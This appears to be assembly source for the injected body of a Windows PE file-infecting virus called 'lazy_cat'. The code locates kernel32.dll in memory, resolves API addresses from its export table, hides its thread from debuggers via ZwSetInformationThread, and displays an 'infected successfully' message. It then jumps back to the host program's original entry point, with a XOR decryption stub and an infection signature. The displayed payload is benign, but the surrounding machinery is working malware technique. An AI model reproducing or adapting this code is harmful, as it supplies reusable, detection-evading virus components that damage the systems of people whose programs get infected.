INJECTCODE_START	equ	this	byte

ENCRYPT_START           equ     this    byte

; user32.dll
szUser32                db      'user32.dll',0
hUser                   dd      0
szMessageBox            db      'MessageBoxA',0
pMessageBox             dd      0

; Kernel32.dll
hKernel			dd	0
szLoadLibraryA		db	'LoadLibraryA',0
pLoadLibraryA		dd	0
szGetProcAddress	db	'GetProcAddress',0	
pGetProcAddress		dd	0
szGetModuleHandle       db      'GetModuleHandleA',0
pGetModuleHandle        dd      0
szGetCurrentThread	db	'GetCurrentThread',0
pGetCurrentThread	dd	0

; Ntdll.dll
hNtdll			dd	0
szNtDll			db	'ntdll.dll',0
szProcName		db	'ZwSetInformationThread',0
pZwSetInformationThread	dd	0


szText                  db      'This file has been infected successfully',0
szCaption               db      'lazy_cat',0


; ×Ö·û´®±È½Ï
pe_strcmp		proc	string1:PTR BYTE, string2:PTR BYTE
			pushad
			mov	esi,string1
			mov	edi,string2
			.while	TRUE
				mov	al,byte ptr [esi]
				mov	ah,byte ptr [edi]
				.if	al != ah
					popad
					mov	eax,FALSE
					ret
				.endif
				.break	.if	al == 0
				inc	esi
				inc	edi
			.endw
			popad
			mov	eax,TRUE
			ret
pe_strcmp		endp

; Search Kernel32.dll's export table, get LoadLibraryA & GetProcAddress's function address.
FindBaseFuncAddress	proc	@hKernel:DWORD, @pLoadLibraryA:ptr DWORD, @pGetProcAddress:ptr DWORD
			LOCAL	@nShouldFound:BYTE
			pushad
			mov	@nShouldFound,2
			mov	edi,@hKernel
			assume	edi:ptr IMAGE_DOS_HEADER
			mov	edi,[edi].e_lfanew
			add	edi,@hKernel
			assume	edi:ptr IMAGE_NT_HEADERS
			add	edi,18h
			assume	edi:ptr IMAGE_OPTIONAL_HEADER
			lea	edi,[edi].DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
			assume	edi:ptr IMAGE_DATA_DIRECTORY
			mov	edi,[edi].VirtualAddress
			add	edi,@hKernel
			assume	edi:ptr IMAGE_EXPORT_DIRECTORY
			mov	ecx,[edi].NumberOfNames
			mov	esi,[edi].AddressOfFunctions
			add	esi,@hKernel ; function address array
			mov	edi,[edi].AddressOfNames
			add	edi,@hKernel ; function name array
			.while	ecx
				mov	ebx,dword ptr [edi]
				add	ebx,@hKernel
				mov	edx,@pLoadLibraryA
				mov	edx,dword ptr [edx]
				.if	!edx
				        call    @F
				@@:
				        pop     edx
				        sub     edx,offset @B
					invoke	pe_strcmp,addr [edx + szLoadLibraryA],ebx
					.if	eax
						mov	eax,dword ptr[esi]
						add	eax,@hKernel
						mov	edx,@pLoadLibraryA
						mov	dword ptr[edx],eax
						mov	dl,@nShouldFound
						dec	dl
						mov	@nShouldFound,dl
					.endif
				.endif
				
				mov	edx,@pGetProcAddress
				mov	edx,dword ptr [edx]
				.if	!edx
				        call    @F
				@@:
				        pop     edx
				        sub     edx,offset @B
					invoke	pe_strcmp,addr [edx + szGetProcAddress],ebx
					.if	eax
						mov	eax,dword ptr[esi]
						add	eax,@hKernel
						mov	edx,@pGetProcAddress
						mov	dword ptr[edx],eax
						mov	dl,@nShouldFound
						dec	dl
						mov	@nShouldFound,dl
					.endif
				.endif
				.break	.if	@nShouldFound == 0
				add	edi,4
				add	esi,4
				dec	ecx
			.endw			
			popad
			ret
FindBaseFuncAddress 	endp

; Find Kernel32.dll's module base.
FindKernel32Base	proc	dwESP:DWORD
			mov	eax,dwESP
			and	eax,0FFFF0000h
			.while	eax
				.if	WORD PTR [eax] == 5A4Dh
					mov	ebx,eax
					assume	ebx:PTR IMAGE_DOS_HEADER
					mov	ebx,[ebx].e_lfanew
					add	ebx,eax
					.if	DWORD PTR [ebx] == 4550h
						ret
					.endif	
				.endif
				sub	eax,10000h
				.break	.if	eax < 70000000h
			.endw
			xor	eax,eax
			ret
FindKernel32Base 	endp

EntryPoint		proc
			mov	eax,[esp]
			invoke	FindKernel32Base,eax
			.while	TRUE
				.break	.if	!eax
				call	@F
			@@:
				pop	ebx
				sub	ebx,offset @B
				
				mov	[ebx + hKernel],eax
				invoke	FindBaseFuncAddress,[ebx + hKernel],addr [ebx + pLoadLibraryA],addr [ebx + pGetProcAddress]
				.break	.if	![ebx + pLoadLibraryA]
				.break	.if	![ebx + pGetProcAddress]
				
				; Main -> 
				; get some API function's address
			        call    @F
			@@:	
			        pop     ebx
			        sub     ebx,offset @B
			        
			        lea     eax,[ebx + szUser32]            ; Load user32.dll
			        push    eax
			        call    [ebx + pLoadLibraryA]
			        mov     [ebx + hUser],eax
			                                        
			        lea     eax,[ebx + szMessageBox]        ; MessageBoxA
			        push    eax
			        push    [ebx + hUser]
			        call    [ebx + pGetProcAddress]
			        mov     [ebx + pMessageBox],eax
			        
			        lea     eax,[ebx + szGetModuleHandle]   ; GetModuleHandleA
			        push    eax
			        push    [ebx + hKernel]
			        call    [ebx + pGetProcAddress]
			        mov     [ebx + pGetModuleHandle],eax
			        
			        lea     eax,[ebx + szGetCurrentThread] 	; GetCurrentThread
			        push    eax
			        push    [ebx + hKernel]
			        call    [ebx + pGetProcAddress]
			        mov	[ebx + pGetCurrentThread],eax
			        
			        ; anti-debug
			        lea	eax,[ebx + szNtDll]		; ntdll.dll
			        push	eax
			        call	[ebx + pGetModuleHandle]
			        mov	[ebx + hNtdll],eax
			        
			        lea	eax,[ebx + szProcName]
			        push	eax
			        push	[ebx + hNtdll]
			        call	[ebx + pGetProcAddress]
			        mov	[ebx + pZwSetInformationThread],eax
			        push	0
			        push	0
			        push	17
			        call	[ebx + pGetCurrentThread]
			        push	eax
			        call	[ebx + pZwSetInformationThread]
			        
			        ; attack code.
			        push    0
			        push	offset szCaption
			        add	dword ptr [esp],ebx
			        lea     eax,[ebx + szText]
			        push    eax
			        push    0
			        call    [ebx + pMessageBox]
			        
			        ; JMP OEP
			        push    0
			        call    [ebx + pGetModuleHandle]
			        assume  eax:ptr IMAGE_DOS_HEADER
			        add     eax,[eax].e_lfanew
			        assume  eax:ptr IMAGE_NT_HEADERS
			        add     eax,4
			        assume  eax:ptr IMAGE_FILE_HEADER
			        movzx   ecx,[eax].NumberOfSections
			        add     eax,0F4h
			        dec     ecx
			        .while  ecx
			                add     eax,sizeof IMAGE_SECTION_HEADER
			                dec     ecx     
			        .endw
			        assume  eax:ptr IMAGE_SECTION_HEADER
			        add     eax,4
			        mov     eax,dword ptr [eax]
			        jmp     eax
			        
				.break
			.endw
EntryPoint		endp

ENCRYPT_END             equ     this    byte    
ENCRYPT_LEN		equ	offset ENCRYPT_END - offset ENCRYPT_START
     
; Restore Code, When a PE is infected, It will run Decryption() first, then jmp to EntryPoint, last jmp to OEP.
Decryption              proc
			jmp	@F
			; infected signature
			dd	'lazy'
			dd	'_cat'
		@@:
			mov	ecx,ENCRYPT_LEN
			shr	ecx,2
			lea	esi,ENCRYPT_START
			call	@F
		@@:
			pop	ebx
			sub	ebx,offset @B
			add	esi,ebx
			.while	TRUE
				.break	.if	ecx == 0
				mov	eax,dword ptr [esi]
				xor	eax,1989
				mov	dword ptr [esi],eax
				add	esi,4
				dec	ecx
			.endw
			lea	eax,EntryPoint
			add	eax,ebx
                        jmp	eax
Decryption              endp

INJECTCODE_END		equ	this	byte
INJECTCODE_LEN		equ	offset INJECTCODE_END - offset INJECTCODE_START